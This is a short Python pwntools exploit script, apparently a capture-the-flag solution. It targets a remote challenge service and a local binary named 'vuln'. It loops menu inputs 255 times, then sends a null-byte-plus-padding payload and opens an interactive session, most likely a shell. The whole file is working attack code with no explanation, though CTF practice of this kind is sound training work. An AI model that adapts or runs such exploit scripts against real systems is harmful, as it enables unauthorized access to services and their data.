from pwn import * 


context.binary = elf =ELF('./vuln')
context.log_level='debug'

p =remote('zero.hackini24.shellmates.club',443,ssl=True)
max=255
#p = process()

for i in range(max):

	p.sendline('1')
	p.recv()





p.sendline(b'2')


p.recv()

payload=b'\0'+b'A'*127
#gdb.attach(p)

p.sendline(payload)
p.interactive()
